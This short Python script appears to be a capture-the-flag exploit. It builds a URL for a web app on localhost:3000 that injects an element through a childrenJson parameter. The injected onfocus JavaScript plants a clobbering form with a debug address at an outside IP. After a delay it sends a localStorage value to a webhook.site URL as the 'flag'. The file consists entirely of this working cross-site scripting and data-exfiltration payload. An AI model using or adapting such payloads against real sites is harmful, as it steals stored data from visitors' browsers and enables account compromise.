from urllib.parse import quote
import json

def generate_children_json(payload):
    if not payload:
        return None
    json_structure = {
        "type": "input",
        "props": {
            "autoFocus": True,
            "onfocus": payload
        },
        "children": None
    }
    return quote(json.dumps(json_structure, separators=(',', ':')))

base = "http://localhost:3000/"
webhook = 'https://webhook.site/0feb7c89-a0ea-4554-81b5-b7dc8caae55d'
payload = """fetch('http://localhost:3000/about', { credentials: 'include' });
const form = document.createElement('form');
form.id = 'config';
form.innerHTML = '<input name="debug" value="http://217.19.4.141:8000" />';
document.body.appendChild(form);"""
payload += 'setTimeout(() => { fetch("WEBHOOK"+"?flag="+localStorage.getItem("debugvaluefortesting")); }, 3000);'.replace('WEBHOOK', webhook)
children_json_quoted = generate_children_json(payload)
url_p = f"{base}?name=span&src=&childrenJson={children_json_quoted}"

print(url_p)